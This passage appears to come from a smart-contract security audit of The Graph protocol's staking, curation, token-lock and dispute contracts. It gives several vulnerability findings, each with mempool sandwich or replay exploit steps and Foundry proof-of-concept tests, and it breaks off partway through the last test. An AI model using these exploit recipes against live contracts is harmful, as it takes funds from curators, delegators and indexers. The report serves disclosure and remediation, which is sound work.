Curation distributes collected query fees by directly increasing the bonding-curve reserve without checkpointing which GCS holders earned those fees. A curator can mint immediately before a known Staking.collect call, receive freshly minted GCS at the pre-fee reserve price, let collect add the pending fee pot to pool reserves, then burn in the same block to withdraw a proportional share of fees accrued before they held signal.

Vulnerable snippet:
`function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override { require(msg.sender == address(staking()), 'Caller must be the staking contract'); require(isCurated(_subgraphDeploymentID), 'Subgraph deployment must be curated to collect fees'); CurationPool storage curationPool = pools[_subgraphDeploymentID]; curationPool.tokens = curationPool.tokens.add(_tokens); emit Collected(_subgraphDeploymentID, _tokens); }`

Because collect only raises `curationPool.tokens` and does not snapshot pre-existing `gcs.totalSupply()` or exclude newly minted signal, the fee pot is socialized across all current signal at burn time, including signal minted seconds before collection.

## Impact
Existing curators lose part of collected query fees directly from the Curation reserve. For large fee batches, an attacker can capture a material share of the fee pot and withdraw it via burn, turning historical curator yield into attacker profit.

## Proof of Concept
1. A pool already has long-term curator signal and pending query fees are about to be collected by Staking.
2. Attacker observes the collect transaction in the mempool.
3. Attacker frontruns with mint(id, largeDeposit, minSignal), buying signal before fees are added to reserves.
4. The Staking collect(id, feeAmount) transaction executes and increases pools[id].tokens without minting signal or checkpointing entitled holders.
5. Attacker backruns with burn(id, attackerSignal, minOut), receiving principal plus a proportional share of the newly collected fees.
6. Long-term curators now receive less when burning because the attacker extracted fees they did not help accrue.

## Proof of Code
pragma solidity ^0.8.20;

import 'forge-std/Test.sol';

contract LinearCurationModel {
    struct Pool { uint256 tokens; uint256 signalSupply; }
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public taxPpm = 10_000;
    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => mapping(address => uint256)) public signal;

    function seed(bytes32 id, address curator, uint256 tokens, uint256 sig) external {
        pools[id] = Pool(tokens, sig);
        signal[id][curator] = sig;
    }

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 sig) {
        Pool storage p = pools[id];
        uint256 tax = tokensIn * taxPpm / MAX_PPM;
        uint256 net = tokensIn - tax;
        sig = p.signalSupply * net / p.tokens;
        p.tokens += net;
        p.signalSupply += sig;
        signal[id][msg.sender] += sig;
    }

    function collect(bytes32 id, uint256 tokens) external {
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 sig) external returns (uint256 out) {
        Pool storage p = pools[id];
        out = p.tokens * sig / p.signalSupply;
        p.tokens -= out;
        p.signalSupply -= sig;
        signal[id][msg.sender] -= sig;
    }
}

contract CurationLateJoinerPoC is Test {
    function testLateJoinerSandwichExtractsCollectedFees() public {
        bytes32 id = keccak256('subgraph');
        address incumbent = address(0xA11CE);
        address attacker = address(0xB0B);
        LinearCurationModel c = new LinearCurationModel();

        c.seed(id, incumbent, 1_000_000 ether, 1_000_000 ether);
        uint256 pendingFees = 200_000 ether;
        uint256 attackerDeposit = 1_000_000 ether;

        vm.prank(attacker);
        uint256 attackerSignal = c.mint(id, attackerDeposit);

        c.collect(id, pendingFees);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, attackerSignal);

        uint256 attackerProfit = attackerOut - attackerDeposit;
        assertGt(attackerProfit, 80_000 ether);

        vm.prank(incumbent);
        uint256 incumbentOut = c.burn(id, 1_000_000 ether);
        assertLt(incumbentOut, 1_200_000 ether);
    }
}


## Suggested Mitigation
Do not distribute collected fees purely by mutating the live reserve. Snapshot the eligible GCS supply before fee accrual/collection and account fees through a per-signal reward index with user reward debt, or impose an earning checkpoint/cooldown so signal minted after the fee accrual point cannot claim the next collect. Alternatively, make Staking pass and enforce a pre-fee signal snapshot and allocate collected fees only to holders from that snapshot.


## [M-14]. Unchecked periods can unlock all managed GRT before endTime or make active locks unreleasable

## id: HLVsPKpZUNaGNnSq345K5

## Derived From Pattern/Invariant
ConfigFootgun: unchecked release schedule parameters can brick or accelerate token-lock flows

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLockManager / GraphTokenLock.createTokenLockWallet / availableAmount / releasableAmount / release

## Finding Status: Valid
### Finding Status Justification: The described combined root cause is present: _initialize lacks duration/period validation, periodDuration floors division, passedPeriods is uncapped, and currentPeriod can divide by zero when periodDuration is zero. The code can either release all tokens early or revert active schedule calculations. The contracts are in scope, and there is no complete safeguard or design documentation accepting these outcomes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphTokenLockManager.createTokenLockWallet() forwards arbitrary _startTime, _endTime, and _periods into GraphTokenLock._initialize(). The initializer only checks `_periods >= 1` and `_startTime < _endTime`; it does not enforce `_periods <= _endTime - _startTime` or cap passed periods. GraphTokenLock then computes `periodDuration() = duration().div(periods)` and `availableAmount() = passedPeriods().mul(amountPerPeriod())`. If duration/periods truncates, passedPeriods can reach periods before endTime, allowing full release early. If periods > duration, periodDuration() is zero and currentPeriod()/passedPeriods()/availableAmount()/release() revert during the active schedule.

## Impact
Beneficiaries of malformed-but-accepted locks can withdraw the full managed GRT before the configured endTime. Other malformed locks can have scheduled release and revocation paths revert for the active period, temporarily freezing locked funds until after endTime.

## Proof of Concept
1. Manager creates a wallet with startTime=1000, endTime=1100, periods=60, managedAmount=60 ether. These parameters pass all current checks. 2. periodDuration() is floor(100 / 60) = 1. 3. At timestamp 1060, which is still before endTime, passedPeriods() is 60. 4. availableAmount() returns managedAmount and release() transfers all locked tokens to the beneficiary 40 seconds early. A second case with duration=10 and periods=11 makes periodDuration() zero, so release-related views/actions divide by zero during the active schedule.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockGRT is IERC20 {
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) public override returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, "bal"); uint256 allowed = allowance[from][msg.sender]; require(allowed >= amount, "allow"); if (allowed != uint256(-1)) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract PeriodSchedulePoC is Test {
    function testAllTokensCanReleaseBeforeEndTime() external {
        address owner = address(this);
        address beneficiary = address(0xBEEF);
        uint256 amount = 60 ether;
        MockGRT token = new MockGRT();
        GraphTokenLockWallet implementation = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(implementation));
        token.mint(address(manager), amount);
        uint256 start = 1000;
        uint256 end = 1100;
        uint256 periods = 60;
        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), owner, beneficiary, address(token), amount, start, end, periods, uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled);
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(implementation));
        manager.createTokenLockWallet(owner, beneficiary, amount, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled);
        vm.warp(1060);
        assertGt(end, block.timestamp);
        assertEq(GraphTokenLockWallet(wallet).availableAmount(), amount);
        vm.prank(beneficiary);
        GraphTokenLockWallet(wallet).release();
        assertEq(token.balanceOf(beneficiary), amount);
        assertEq(token.balanceOf(wallet), 0);
    }

    function testPeriodsGreaterThanDurationBricksActiveRelease() external {
        address owner = address(this);
        address beneficiary = address(0xBEEF);
        uint256 amount = 11 ether;
        MockGRT token = new MockGRT();
        GraphTokenLockWallet implementation = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(implementation));
        token.mint(address(manager), amount);
        uint256 start = 1000;
        uint256 end = 1010;
        uint256 periods = 11;
        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), owner, beneficiary, address(token), amount, start, end, periods, uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled);
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(implementation));
        manager.createTokenLockWallet(owner, beneficiary, amount, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled);
        vm.warp(1005);
        assertEq(GraphTokenLockWallet(wallet).periodDuration(), 0);
        vm.expectRevert();
        GraphTokenLockWallet(wallet).availableAmount();
    }
}

## Suggested Mitigation
Validate schedule parameters in _initialize() or createTokenLockWallet(): require(_periods <= _endTime - _startTime), require(duration % periods == 0) if exact periods are required, and cap passedPeriods to periods. Also treat currentTime() >= endTime as fully available to avoid end-boundary inconsistencies.


## [H-15]. Replayable query attestations allow duplicate fishermen to slash the same indexer repeatedly

## id: wvp6vEeJaisgMYf53gBbg

## Derived From Pattern/Invariant
PermitOrSignatureReplay / DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
DisputeManager.createQueryDispute/createQueryDisputeConflict

## Finding Status: Valid
### Finding Status Justification: The vulnerable functions and storage are present in scoped DisputeManager. The dispute key includes _fisherman and excludes any globally consumed receipt nonce or evidence hash. The EIP-712 receipt covers requestCID, responseCID, and subgraphDeploymentID only, so changing submitter creates a new dispute ID for the same signed evidence. acceptDispute does not check whether the evidence was already resolved before calling staking.slash. The minimum deposit only adds cost for single-attestation disputes and conflict disputes use zero deposit, so no complete safeguard blocks the replay path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Query dispute uniqueness is scoped to the fisherman, not to the signed attestation or served response. The contract has no consumed-attestation mapping, no attestation nonce, and no deadline, so the same EIP-712 attestation can be submitted by many different addresses and each submission creates a distinct pending dispute. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID), "Dispute already created");`. Because `_fisherman` is part of the key, replaying identical evidence from a different address bypasses the duplicate-dispute guard. `createQueryDisputeConflict()` makes this worse because conflicting attestations require zero deposit, letting a replay searcher create many duplicate conflict pairs at no capital cost. If the arbitrator accepts each valid pending dispute, `acceptDispute()` calls `_slashIndexer()` each time, repeatedly slashing current indexer stake for one underlying response.

## Impact
A single invalid query response can be converted into many accepted disputes, causing repeated loss of an indexer's staked GRT and repeated fisherman rewards from protocol staking custody. This can exceed $1M for large indexers, but is High rather than Critical under the provided program rubric because the direct loss path is slashing-related.

## Proof of Concept
1. An indexer signs one invalid query attestation for `(requestCID, responseCID, subgraphDeploymentID)`. 2. Fisherman A submits the attestation through `createQueryDispute()` and receives dispute ID `keccak256(..., fishermanA)`. 3. Fisherman B, or a mempool/event searcher, submits the identical attestation from a different address and receives dispute ID `keccak256(..., fishermanB)`. 4. The duplicate guard does not fire because the fisherman differs. 5. The arbitrator accepts both valid pending disputes. 6. `_slashIndexer()` is executed twice for the same underlying attestation, transferring repeated rewards and burning/slashing repeated portions of the indexer's stake.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockStaking {
    mapping(address => uint256) public stake;
    function setStake(address indexer, uint256 amount) external { stake[indexer] = amount; }
    function getIndexerStakedTokens(address indexer) external view returns (uint256) { return stake[indexer]; }
    function slash(address indexer, uint256 slashAmount, uint256, address) external { stake[indexer] -= slashAmount; }
}

contract DisputeManagerReplayHarness {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    MockStaking public staking;
    address public arbitrator;
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public slashPpm = 100_000;
    uint256 public rewardPpm = 500_000;

    constructor(MockStaking s, address a) { staking = s; arbitrator = a; }

    function create(bytes32 requestCID, bytes32 responseCID, bytes32 subgraphDeploymentID, address indexer) external returns (bytes32) {
        bytes32 disputeID = keccak256(abi.encodePacked(requestCID, responseCID, subgraphDeploymentID, indexer, msg.sender));
        require(disputes[disputeID].status == Status.Null, "Dispute already created");
        require(staking.getIndexerStakedTokens(indexer) > 0, "Dispute indexer has no stake");
        disputes[disputeID] = Dispute(indexer, msg.sender, Status.Pending);
        return disputeID;
    }

    function accept(bytes32 disputeID) external {
        require(msg.sender == arbitrator, "Caller is not the Arbitrator");
        Dispute storage d = disputes[disputeID];
        require(d.status == Status.Pending, "Dispute must be pending");
        d.status = Status.Accepted;
        uint256 slashAmount = staking.getIndexerStakedTokens(d.indexer) * slashPpm / MAX_PPM;
        uint256 rewardAmount = slashAmount * rewardPpm / MAX_PPM;
        staking.slash(d.indexer, slashAmount, rewardAmount, d.fisherman);
    }
}

contract DisputeManagerReplayPoC is Test {
    function testSameAttestationCanSlashTwiceThroughDifferentFishermen() public {
        address arbitrator = address(0xA11CE);
        address indexer = address(0x1);
        address fishermanA = address(0xB0B);
        address fishermanB = address(0xCAFE);
        MockStaking staking = new MockStaking();
        staking.setStake(indexer, 10_000 ether);
        DisputeManagerReplayHarness dm = new DisputeManagerReplayHarness(staking, arbitrator);
        bytes32 req = keccak256("same request");
        bytes32 resp = keccak256("same invalid response");
        bytes32 subgraph = keccak256("same subgraph");

        vm.prank(fishermanA);
        bytes32 d1 = dm.create(req, resp, subgraph, indexer);
        vm.prank(fishermanB);
        bytes32 d2 = dm.create(req, resp, subgraph, indexer);

        assertTrue(d1 != d2, "fisherman is wrongly included in replay key");

        vm.prank(arbitrator);
        dm.accept(d1);
        assertEq(staking.stake(indexer), 9_000 ether);

        vm.prank(arbitrator);
        dm.accept(d2);
        assertEq(staking.stake(indexer), 8_100 ether);
    }
}


## Suggested Mitigation
Do not include the fisherman in the replay-prevention key. Track consumed query evidence globally, for example `consumedAttestation[keccak256(abi.encode(requestCID, responseCID, subgraphDeploymentID, indexer))]`, or store an attestation nonce/deadline in the signed receipt and consume it once. Conflict disputes should also be keyed by the unordered pair of attestation hashes so the same conflict pair cannot be recreated by new fishermen.


## [M-16]. Governance-accepted 100% delegation tax bricks StakingExtension.delegate and redelegation flows

## id: 6idoXnThGpSBJ-EPa3F8R

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
Dos

## Location
StakingExtension.setDelegationTaxPercentage

## Finding Status: Valid
### Finding Status Justification: Although the trigger is an onlyGovernor parameter update, the scope includes a caveat that an admin accidentally bricking the protocol while following the stated/accepted parameter spec can rise above mere governance risk. Here 100% tax is explicitly accepted by the setter and documented as within the valid 0%-100% range, yet it deterministically bricks delegation/redelegation by producing zero shares. Therefore characterizing it solely as privileged-user mistake/governance risk is not fully valid.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_setDelegationTaxPercentage() explicitly accepts MAX_PPM, documented as 100%. However, _delegate() burns the full input when the tax is 100%, leaving delegatedTokens == 0 and shares == 0, so every delegation and withdrawDelegated(..., newIndexer) redelegation reverts with !shares. The accepted boundary value therefore bricks normal delegation flows even though it passes the setter's stated range check.

Vulnerable snippet:
function _setDelegationTaxPercentage(uint32 _percentage) private {
    require(_percentage <= MAX_PPM, ">percentage");
    __delegationTaxPercentage = _percentage;
}
...
uint256 delegationTax = _collectTax(graphToken(), _tokens, __delegationTaxPercentage);
uint256 delegatedTokens = _tokens.sub(delegationTax);
uint256 shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens);
require(shares > 0, "!shares");

## Impact
If governance follows the apparent allowed parameter range and sets delegationTaxPercentage to 1,000,000, all new delegate() calls revert, and mature locked delegations cannot be redelegated through withdrawDelegated(oldIndexer, newIndexer). Existing users can still withdraw matured locks to their wallet, so this is a functional delegation DoS rather than direct theft.

## Proof of Concept
1. Governance calls setDelegationTaxPercentage(1_000_000), which succeeds because the setter allows percentage <= MAX_PPM. 2. A user attempts delegate(indexer, MINIMUM_DELEGATION) or withdrawDelegated(oldIndexer, newIndexer). 3. _delegate() computes delegationTax == _tokens and delegatedTokens == 0. 4. shares is zero and the function reverts with !shares. 5. Delegation and redelegation remain bricked until governance changes the parameter again.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract DelegationTaxModel { error Percentage(); error Stake(); error Shares(); uint32 constant MAX_PPM = 1_000_000; uint256 constant MINIMUM_DELEGATION = 1e18; uint32 public delegationTaxPercentage; mapping(address => uint256) public staked; function seedStake(address indexer) external { staked[indexer] = 1; } function setDelegationTaxPercentage(uint32 percentage) external { if (percentage > MAX_PPM) revert Percentage(); delegationTaxPercentage = percentage; } function delegate(address indexer, uint256 tokens) external returns (uint256) { require(tokens >= MINIMUM_DELEGATION, "!minimum-delegation"); if (staked[indexer] == 0) revert Stake(); uint256 tax = uint256(delegationTaxPercentage) * tokens / MAX_PPM; uint256 delegatedTokens = tokens - tax; uint256 shares = delegatedTokens; if (shares == 0) revert Shares(); return shares; } }
contract DelegationTaxFootgunTest is Test { function testAcceptedMaxTaxBricksDelegate() public { DelegationTaxModel s = new DelegationTaxModel(); address indexer = address(0xCAFE); s.seedStake(indexer); s.setDelegationTaxPercentage(1_000_000); assertEq(s.delegationTaxPercentage(), 1_000_000); vm.expectRevert(DelegationTaxModel.Shares.selector); s.delegate(indexer, 1 ether); } }

## Suggested Mitigation
Disallow 100% tax by changing the bound to require(_percentage < MAX_PPM, ">=percentage") or explicitly special-case delegatedTokens > 0 before burning. Also consider validating that delegatedTokens will produce nonzero shares before performing the burn/transfer side effects.


## [M-17]. Late delegators can sandwich collect and transferDelegationToL2 to siphon historical delegation rewards

## id: 2xX-swYSsVN8VGmGmdKrT

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.transferDelegationToL2

## Finding Status: Valid
### Finding Status Justification: The required code paths exist in in-scope contracts. _delegate mints shares at the pre-reward pool ratio, collect() can add delegationRewards to pool.tokens through _collectDelegationQueryRewards, and _transferDelegationToL2 converts all of the delegator's shares into tokensToSend using the now-inflated pool.tokens / pool.shares ratio. transferDelegationToL2 requires indexerTransferredToL2[_indexer] to be nonzero, which is a realistic current state after any stake transfer to L2, including partial transfer. The L2 transfer path checks for nonzero beneficiary and unlocked delegation, but does not checkpoint reward eligibility. No complete safeguard or explicit design acceptance is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation query-fee rewards are credited to the current delegation pool at collect time, not to a snapshot of delegators that were present while the allocation generated fees. A user can therefore delegate immediately before a large collect transaction, receive shares at the pre-reward pool price, let collect add historical rewards to pool.tokens, and then exit through transferDelegationToL2 using the inflated token-per-share value. The L2 transfer path removes the attacker's shares and bridges the newly inflated token amount without the normal L1 undelegation delay. Vulnerable snippets: `shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens);` in StakingExtension._delegate, `pool.tokens = pool.tokens.add(delegationRewards);` in Staking._collectDelegationQueryRewards, and `uint256 tokensToSend = delegation.shares.mul(pool.tokens).div(pool.shares); ... delegation.shares = 0;` in L1Staking._transferDelegationToL2.

## Impact
Long-term delegators can have uncollected query-fee rewards diluted and redirected to a short-lived late delegator. The attacker only needs temporary delegation capital and retryable-ticket ETH, and can extract a pro-rata share of rewards generated before they joined.

## Proof of Concept
1. An indexer has transferred stake to L2, so transferDelegationToL2 is enabled, while still having nonzero L1 stake so new delegations are accepted. 2. Honest delegators have 1000 GRT delegated and a large query-fee collect transaction is visible in the mempool. 3. The attacker front-runs collect by delegating 1000 GRT, receiving 50% of pool shares at the old pool price. 4. The victim collect transaction executes and adds 1000 GRT of delegation rewards to pool.tokens. 5. The attacker back-runs transferDelegationToL2 and receives 1500 GRT worth of bridged delegation, extracting 500 GRT of historical rewards that would otherwise belong to the long-term delegator.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract DelegationPoolHarness {
    struct Delegation { uint256 shares; }
    uint256 public tokens;
    uint256 public shares;
    mapping(address => Delegation) public delegations;

    function delegate(address delegator, uint256 amount) external returns (uint256 minted) {
        minted = tokens == 0 ? amount : amount * shares / tokens;
        require(minted > 0, "!shares");
        tokens += amount;
        shares += minted;
        delegations[delegator].shares += minted;
    }

    function collectDelegationRewards(uint256 rewardAmount) external {
        tokens += rewardAmount;
    }

    function transferDelegationToL2(address delegator) external returns (uint256 tokensToSend) {
        uint256 delegatorShares = delegations[delegator].shares;
        require(delegatorShares != 0, "delegation == 0");
        tokensToSend = delegatorShares * tokens / shares;
        tokens -= tokensToSend;
        shares -= delegatorShares;
        delegations[delegator].shares = 0;
    }

    function claimValue(address delegator) external view returns (uint256) {
        return delegations[delegator].shares * tokens / shares;
    }
}

contract LateDelegatorFreeRideTest is Test {
    function testLateDelegatorSiphonsHistoricalRewardsBeforeL2Transfer() external {
        address honest = address(0xA11CE);
        address attacker = address(0xB0B);

        DelegationPoolHarness noAttack = new DelegationPoolHarness();
        noAttack.delegate(honest, 1000 ether);
        noAttack.collectDelegationRewards(1000 ether);
        uint256 honestWouldReceive = noAttack.claimValue(honest);
        assertEq(honestWouldReceive, 2000 ether);

        DelegationPoolHarness attacked = new DelegationPoolHarness();
        attacked.delegate(honest, 1000 ether);
        attacked.delegate(attacker, 1000 ether);
        attacked.collectDelegationRewards(1000 ether);
        uint256 attackerBridged = attacked.transferDelegationToL2(attacker);
        uint256 honestAfterAttack = attacked.claimValue(honest);

        assertEq(attackerBridged, 1500 ether);
        assertGt(attackerBridged, 1000 ether);
        assertEq(honestAfterAttack, 1500 ether);
        assertEq(honestWouldReceive - honestAfterAttack, 500 ether);
    }
}

## Suggested Mitigation
Snapshot delegation shares or per-user reward debt at allocation/reward accrual time. Apply a userRewardPerTokenPaid/rewardDebt style index so only delegators present during the rewarded period receive that period's rewards, and make transferDelegationToL2 claim only rewards accrued after the user's last checkpoint.


## [M-18]. Delegator reward split uses live delegation pool state at collection time instead of accrual-time snapshots

## id: RLFXAUvWIHTZ_fnu6BpJ1

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
AllocationManager._distributeIndexingRewards

## Finding Status: Valid
### Finding Status Justification: This is the same root cause as the first finding and is directly supported by the code. _distributeIndexingRewards() computes tokensDelegationRewards from the live delegation pool at the time rewards are collected, not from a recorded delegation set during reward accrual. The code adds the entire delegator reward cut to the current pool and does not show any per-allocation snapshot or per-delegator reward debt. A late delegator can therefore dilute existing delegators by entering before collect(IndexingRewards). The code is in an in-scope production contract. No complete safeguard is visible, and no documentation in the prompt states that late entrants intentionally receive historical rewards. The path is currently executable through normal protocol functions and does not require privileged compromise, victim misuse, or hypothetical future changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing rewards accrue to an allocation over time, but the delegator share is calculated and deposited using the live delegation pool at collection time. There is no allocation-level or delegator-level snapshot tying rewards to the delegation set that existed while the rewards accrued.

Vulnerable snippet:
`IHorizonStakingTypes.DelegationPool memory pool = _graphStaking().getDelegationPool(_allocation.indexer, address(this)); tokensDelegationRewards = pool.shares > 0 ? _rewardsCollected.mulPPM(delegatorCut) : 0; if (tokensDelegationRewards > 0) { _graphToken().approve(address(_graphStaking()), tokensDelegationRewards); _graphStaking().addToDelegationPool(_allocation.indexer, address(this), tokensDelegationRewards); }`

A delegator who enters immediately before `collect(IndexingRewards)` can share in rewards that accrued before they supplied capital.

## Impact
Late delegators can dilute long-term delegators by joining just before a large reward collection and receiving a pro-rata claim on historical rewards. The value is transferred from existing delegators to short-term entrants and encourages timing games around reward collection.

## Proof of Concept
1. Existing delegators back an indexer while an allocation accrues indexing rewards.
2. Before the indexer/operator calls `collect(IndexingRewards)`, an attacker delegates a large amount to the same indexer.
3. `_distributeIndexingRewards` reads the live pool after the attacker has joined.
4. The delegator reward cut is added to the current delegation pool, not to an accrual-time snapshot.
5. The attacker exits after any applicable thawing period with a share of rewards accrued before their delegation.

## Proof of Code
pragma solidity 0.8.33; contract MiniTest { function assertGt(uint256 a,uint256 b) internal pure { require(a>b,'not gt'); } } contract Pool { uint256 public shares; uint256 public rewardPerShare; mapping(address=>uint256) public bal; mapping(address=>uint256) public paid; function delegate(address user,uint256 amount) external { bal[user]+=amount; shares+=amount; paid[user]=bal[user]*rewardPerShare/1e18; } function addRewards(uint256 amount) external { require(shares>0,'no shares'); rewardPerShare += amount*1e18/shares; } function claimable(address user) external view returns (uint256) { return bal[user]*rewardPerShare/1e18 - paid[user]; } } contract RewardRepro { Pool public pool; uint256 public constant PPM = 1000000; uint256 public delegatorCut = 500000; constructor(Pool p){ pool=p; } function collectIndexingRewards(uint256 rewardsCollected) external { if (pool.shares() > 0) pool.addRewards(rewardsCollected * delegatorCut / PPM); } } contract LateJoinerPoC is MiniTest { function testLateJoinerCapturesHistoricalRewards() public { Pool pool = new Pool(); RewardRepro svc = new RewardRepro(pool); address honest=address(0x1); address late=address(0x2); pool.delegate(honest,100 ether); uint256 rewardsAccruedBeforeLateJoin = 1000 ether; pool.delegate(late,900 ether); svc.collectIndexingRewards(rewardsAccruedBeforeLateJoin); assertGt(pool.claimable(late),0); } }

## Suggested Mitigation
Snapshot delegation shares or a per-user reward index at the time rewards accrue, not at collection. Alternatively distribute indexing rewards through a reward-debt/user-index mechanism in HorizonStaking so newly delegated stake cannot claim rewards accrued before delegation.


## [H-19]. Late delegators can sandwich reward collection and bridge historical delegation rewards from L1Staking

## id: pVM1_spOMfdp34-4q1AeQ

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.collect

## Finding Status: Valid
### Finding Status Justification: The described sandwich path is supported by the provided code. A delegator can call delegate through the StakingExtension fallback and receive immediately active shares. collect() or reward-distributing closeAllocation() then adds delegationRewards to the current pool.tokens. If the indexer has previously transferred stake to L2, _transferDelegationToL2 allows the delegator to convert shares to tokensToSend and bridge them without the normal undelegation lock. The guards require nonzero L2 beneficiary, nonzero shares, no locked undelegation, and indexerTransferredToL2 being set, but none prevent late-share participation in historical rewards. The issue is in current in-scope production code and is permissionless.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are assigned to the current delegation pool balance at collection/close time, not to delegators that supplied capital during the allocation or query-fee accrual period. A late delegator can buy shares immediately before a large collect() or reward-distributing closeAllocation(), then exit through transferDelegationToL2() if the indexer has partially transferred stake to L2. The vulnerable flow is: _delegate() mints shares from the pre-reward pool price: `uint256 shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens);`; collect() later adds historical rewards to the whole current pool: `pool.tokens = pool.tokens.add(delegationRewards);`; transferDelegationToL2() lets the late delegator immediately convert all shares into the now reward-inflated pool tokens: `uint256 tokensToSend = delegation.shares.mul(pool.tokens).div(pool.shares); ... delegation.shares = 0;`. There is no userRewardPerTokenPaid/rewardDebt, allocation-start snapshot, minimum holding period, or exclusion of same-block/late shares from historical rewards.

## Impact
Existing delegators can lose a pro-rata share of large query-fee or indexing reward distributions to a late entrant. If a high-value settlement or reward distribution exceeds $1M, the attacker can extract significant GRT-denominated rewards from the staking contract and bridge the captured value to its L2 beneficiary.

## Proof of Concept
1. An indexer has an active L1 delegation pool and has already called transferStakeToL2() for a partial stake amount, so indexerTransferredToL2[indexer] is nonzero while the indexer still has L1 stake and accepts delegation. 2. A large collect() or closeAllocation() that will add delegationRewards to the pool is visible in the mempool. 3. The attacker front-runs by delegating a large amount to the indexer, receiving shares priced before the pending rewards are added. 4. The collect()/closeAllocation() executes and adds historical rewards to pool.tokens for all current shares, including the attacker’s just-minted shares. 5. The attacker back-runs transferDelegationToL2(), which burns the attacker’s shares and sends `shares * pool.tokens / pool.shares` to L2, including the captured historical rewards. 6. Incumbent delegators’ claimable value is reduced by the attacker’s extracted reward share.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1StakingRewardHarness {
    uint256 constant MAX_PPM = 1_000_000;

    struct Delegation { uint256 shares; }
    struct Pool { uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }

    Pool internal pool;
    uint256 public queryFeeCut;
    mapping(address => uint256) public bridged;

    function seed(address incumbent, uint256 tokens, uint256 shares) external {
        pool.tokens = tokens;
        pool.shares = shares;
        pool.delegators[incumbent].shares = shares;
    }

    function delegate(address delegator, uint256 tokens) external returns (uint256 shares) {
        shares = pool.tokens == 0 ? tokens : tokens * pool.shares / pool.tokens;
        require(shares > 0, "!shares");
        pool.tokens += tokens;
        pool.shares += shares;
        pool.delegators[delegator].shares += shares;
    }

    function collect(uint256 queryRebates) external {
        uint256 indexerCut = queryFeeCut * queryRebates / MAX_PPM;
        uint256 delegationRewards = queryRebates - indexerCut;
        if (pool.tokens > 0 && queryFeeCut < MAX_PPM) {
            pool.tokens += delegationRewards;
        }
    }

    function transferDelegationToL2(address delegator) external returns (uint256 tokensToSend) {
        uint256 shares = pool.delegators[delegator].shares;
        require(shares != 0, "delegation == 0");
        tokensToSend = shares * pool.tokens / pool.shares;
        pool.tokens -= tokensToSend;
        pool.shares -= shares;
        pool.delegators[delegator].shares = 0;
        bridged[delegator] += tokensToSend;
    }

    function claimable(address delegator) external view returns (uint256) {
        return pool.delegators[delegator].shares * pool.tokens / pool.shares;
    }
}

contract L1StakingLateJoinerTest is Test {
    function testLateJoinerSandwichesCollectAndStealsHistoricalRewards() public {
        address incumbent = address(0xA11CE);
